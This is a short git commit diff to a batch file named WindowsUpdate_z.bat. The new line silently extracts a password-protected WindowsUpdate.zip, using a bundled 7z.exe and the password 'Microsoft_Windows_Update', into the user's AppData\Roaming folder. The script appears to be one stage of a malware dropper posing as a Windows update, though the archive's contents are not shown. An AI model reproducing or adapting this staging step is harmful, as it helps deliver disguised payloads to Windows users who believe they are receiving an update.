9caba8b4abe17a216ac11f246ab7b7ef3c983e8a
festorex <94487372+festorex@users.noreply.github.com>
2021-11-25 17:02:56 +0100

    Update WindowsUpdate_z.bat

--- WindowsUpdate_z.bat
+++ WindowsUpdate_z.bat
@@ -1,2 +1,2 @@
 @echo off
-cmd.exe /C "C:\Windows\Temp\7z.exe x C:\Windows\Temp\WindowsUpdate.zip -oC:\Windows\Temp -pMicrosoft_Windows_Update -aos"
+cmd.exe /C "C:\Users\%username%\AppData\Roaming\7z.exe x C:\Users\%username%\AppData\Roaming\WindowsUpdate.zip -oC:\Users\%username%\AppData\Roaming -pMicrosoft_Windows_Update -aos"
